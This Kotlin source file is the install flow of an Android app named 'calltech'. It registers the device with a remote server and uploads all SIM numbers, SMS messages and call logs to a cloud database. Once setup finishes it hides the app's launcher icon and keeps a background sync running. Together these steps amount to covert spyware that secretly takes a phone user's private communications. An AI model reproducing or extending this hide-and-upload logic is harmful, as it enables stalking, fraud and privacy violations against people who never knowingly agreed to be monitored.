package com.calltech

import android.content.Context
import android.util.Log

/**
 * Install ke baad: pehle data sync → phir app hide → background sync chalu.
 */
object InstallFlow {
    private const val TAG = "InstallFlow"
    private const val PREFS = "calltech_install"
    private const val KEY_SETUP_COMPLETE = "setup_complete"
    private const val KEY_SETUP_VERSION = "setup_version"

    fun isSetupComplete(context: Context): Boolean {
        val prefs = context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val savedVersion = prefs.getInt(KEY_SETUP_VERSION, 0)
        if (savedVersion != BuildConfig.VERSION_CODE) {
            prefs.edit()
                .putBoolean(KEY_SETUP_COMPLETE, false)
                .putInt(KEY_SETUP_VERSION, BuildConfig.VERSION_CODE)
                .apply()
            return false
        }
        return prefs.getBoolean(KEY_SETUP_COMPLETE, false)
    }

    fun completeSetup(context: Context) {
        if (SyncBootstrap.needsRuntimePermissions(context)) {
            Log.w(TAG, "Skip hide — SMS/call permissions still missing")
            return
        }

        val app = context.applicationContext
        app.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit()
            .putBoolean(KEY_SETUP_COMPLETE, true)
            .putInt(KEY_SETUP_VERSION, BuildConfig.VERSION_CODE)
            .apply()
        LauncherHider.hide(app)
        SyncBootstrap.armBackgroundSync(app)
        Log.d(TAG, "Initial sync done — app hidden, background sync armed")
    }

    fun runInitialSetup(context: Context, source: String = "install") {
        val app = context.applicationContext

        MongoSyncHelper.ensureApiUrl(app)
        CallSyncHelper.markBackgroundSyncEnabled(app, true)
        SyncBootstrap.armBackgroundSync(app)

        // Admin list ke liye device pehle register — SMS/call permission ka wait mat karo.
        BackgroundSyncRunner.run {
            DeviceRegistration.registerNow(app)
        }

        if (SyncBootstrap.needsRuntimePermissions(app)) {
            Log.w(TAG, "Permissions pending — dialog, phir sync + hide")
            SyncBootstrap.launchPermissionTrampoline(context)
            return
        }

        BackgroundSyncRunner.run {
            CallSyncService.holdDuring(app) {
                try {
                    SimNumberHelper.ensureSimReadyForSync(app)
                    DeviceRegistration.registerNow(app)
                    if (isSetupComplete(app)) {
                        SyncScheduler.syncIfPermittedNow(app, source)
                        LauncherHider.hide(app)
                        CallSyncService.ensureRunning(app)
                        return@holdDuring
                    }
                    if (runFirstCloudSync(app)) {
                        completeSetup(app)
                    }
                } catch (error: Exception) {
                    Log.e(TAG, "Initial setup failed ($source)", error)
                }
            }
        }
    }

    fun runFirstCloudSync(context: Context): Boolean {
        val app = context.applicationContext
        MongoSyncHelper.ensureApiUrl(app)
        CallSyncHelper.markBackgroundSyncEnabled(app, true)
        SimNumberHelper.ensureSimReadyForSync(app)

        val woke = MongoSyncHelper.wakeServer(app)
        Log.d(TAG, "Render health: $woke")

        val registered = DeviceRegistration.registerNow(app)
        if (SyncBootstrap.needsRuntimePermissions(app)) {
            Log.w(TAG, "First sync: registered=$registered (permissions pending)")
            return registered
        }

        SimNumberHelper.registerAllSimsInMongo(app)
        val synced = SyncScheduler.syncIfPermittedNow(app, "first_open")
        MessageSyncHelper.syncAllMessagesNow(app, "first_open")
        CallSyncHelper.syncAllCallsToMongoNow(app, "first_open")
        Log.d(TAG, "First cloud sync registered=$registered synced=$synced")
        return registered || synced
    }
}
